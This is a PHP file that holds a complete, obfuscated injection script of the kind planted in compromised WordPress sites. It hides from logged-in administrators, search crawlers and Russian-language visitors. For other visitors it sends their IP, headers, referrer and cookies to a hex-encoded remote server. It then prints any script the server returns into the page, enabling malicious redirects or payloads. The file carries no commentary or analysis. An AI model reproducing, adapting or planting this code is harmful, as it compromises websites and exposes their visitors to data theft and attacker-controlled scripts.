<?php if(isset($_COOKIE['x0v'])) {die('6WECHPD');}if(!@function_exists('getallheaders')){function getallheaders(){$headers=array();foreach($_SERVER as $name => $value){if(substr($name,0,5)== 'HTTP_'){$headers[str_replace(' ','-',ucwords(strtolower(str_replace('_',' ',substr($name,5)))))]=$value;}}return $headers;}}if(!class_exists('CURLOPT_REQUEST')){if(@function_exists('is_user_logged_in')){if(is_user_logged_in()){return false;}}@ini_set('display_errors',0);@ini_set('error_reporting',0);@ini_set('log_errors',NULL);@ini_set('default_socket_timeout',3);$bad_ua='#(google|msnbot|baidu|yahoo|search|bing|ask|indexer|cuill.com|clushbot|360spider|80legs|aibot|aboundex|acunetix|ahrefsbot|alexibot|blexbot|backdoorbot|backweb|baiduspider|bandit|batchftp|bigfoot|blackwidow|blowfish|botalot|buddy|builtbottough|bullseye|bunnyslippers|cegbfeieh|cheesebot|cherrypicker|chinaclaw|cogentbot|collector|copier|copyrightcheck|crescent|custo|diibot|disco|dittospyder|drip|easydl|eirgrabber|emailcollector|emailsiphon|emailwolf|erocrawler|exabot|extractor|eyenetie|fhscan|foobot|frontpage|go-ahead-got-it|grabnet|grafula|hmview|httrack|harvest|ilsebot|infonavibot|infotekies|intelliseek|interget|iria|joc|jakarta|jennybot|jetcar|justview|jyxobot|lnspiderguy|lexibot|linkscan|linkwalker|linkextractorpro|linkpadbot|miixpc|mj12bot|mag-net|magnet|markwatch|memo|mirror|nameprotect|nicerspro|npbot|navroad|nearsite|netants|netmechanic|netspider|netzip|netcraft|nextgensearchbot|nimblecrawler|ninja|octopus|openfind|outfoxbot|pagegrabber|pockey|propowerbot|prowebwalker|pump|rma|reget|realdownload|reaper|recorder|repomonkey|seokicks|searchmetricsbot|semrushbot|siphon|siteexplorer|sitesnagger|slysearch|smartdownload|snake|snapbot|snoopy|spacebison|spankbot|sqworm|stripper|sucker|superbot|superhttp|surfbot|szukacz|teleport|telesoft|thenomad|tighttwatbot|titan|true_bot|turnitinbot|turnitinbot|vci|vacuum|voideye|wisenutbot|www-collector-e|wwwoffle|webauto|webbandit|webcopier|webemailextrac|webenhancer|webfetch|webleacher|webreaper|websauger|webstripper|webwhacker|webzip|webmasterworldforumbot|webster|wget|whacker|widow|xaldon|xenu|zeus|zmeu|zyborg|asterias|attach|cosmos|dragonfly|ecatch|ebingbong|flunky|gotit|hloader|humanlinks|ia_archiver|larbin|lftp|likse|lwp-trivial|moget|niki-bot|pavuk|pcbrowser|psbot|rogerbot|sogou|spanner|spbot|suzuran|takeout|turingos)#i';$bad_uri='#\?view=login|\?view=registration|\?wc-ajax|xmlrpc.php|wp-includes|wp-content|wp-login.php|wp-cron.php|\?feed=|wp-json|\/feed|\.css|\.js|\.ico|\.png|\.gif|\.bmp|\.tiff|\.mpg|\.wmv|\.mp3|\.mpeg|\.zip|\.gzip|\.rar|\.exe|\.pdf|\.doc|\.swf|\.txt|wp-admin|administrator#i';$ruri=strtolower(trim($_SERVER["REQUEST_URI"],"\t\n\r\0\x0B/"));if(@preg_match($bad_ua,strtolower($_SERVER["HTTP_USER_AGENT"]))|| preg_match($bad_uri,$ruri)){return;}class CURLOPT_REQUEST{public $params=array();public $cookie;public $host;public $u="\x68\x74\x74\x70:\x2f/\x345\x2e9\x2e2\x30.\x310\x33/\x61p\x69.\x70h\x70";private function get_ip(){$ip=null;$headers=array('HTTP_X_FORWARDED_FOR','HTTP_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_FORWARDED','HTTP_CLIENT_IP','HTTP_FORWARDED_FOR_IP','X_FORWARDED_FOR','FORWARDED_FOR','X_FORWARDED','FORWARDED','CLIENT_IP','FORWARDED_FOR_IP','HTTP_PROXY_CONNECTION');foreach($headers as $header){if(!empty($_SERVER[$header])){$tmp=explode(',',$_SERVER[$header]);$ip=trim($tmp[0]);break;}}if(strstr($ip,',')){$tmp=explode(',',$ip);if(stristr($_SERVER['HTTP_USER_AGENT'],'mini')){$ip=trim($tmp[count($tmp)-2]);}else{$ip=trim($tmp[0]);}}if(empty($ip)){$ip=isset($_SERVER['REMOTE_ADDR'])?$_SERVER['REMOTE_ADDR']:'127.0.0.1';}return $ip;}function init(){$this->host=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:'localhost';if(@strpos(@strtolower($this->cookie),'wordpress_logged_in')!== False){return;}$lang=(isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])?substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2):'');if($lang == 'ru'){return;}$referrer=isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:null;$this->params=array('ip'=> $this->get_ip(),'ua'=> isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:null,'language'=> $lang,'seReferrer'=> $referrer,'referrer'=> $referrer,'original_headers'=> getallheaders(),'original_host'=> $this->host,'info'=> 0,'token'=> 'fdv9ysmvqjzgk4nt5hprbtgwtrdbmbwh');$this->cookie=isset($_SERVER["HTTP_COOKIE"])?preg_replace('/PHPSESSID=.*?;/si','',$_SERVER["HTTP_COOKIE"]):null;$result=$this->request($this->u);$c=@json_decode($result,true);if(isset($c['redirect']['content'])){if(substr($c['redirect']['content'],0,7)== '<script'){print $c['redirect']['content'];}}}function request($url){if(@function_exists('curl_init')){$ch=curl_init($url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_COOKIE,$this->cookie);curl_setopt($ch,CURLOPT_NOBODY,0);curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,5);curl_setopt($ch,CURLOPT_TIMEOUT,10);curl_setopt($ch,CURLOPT_USERAGENT,'KHttpClient');curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($this->params));return curl_exec($ch);}}}$obj=new CURLOPT_REQUEST;$obj->init();}
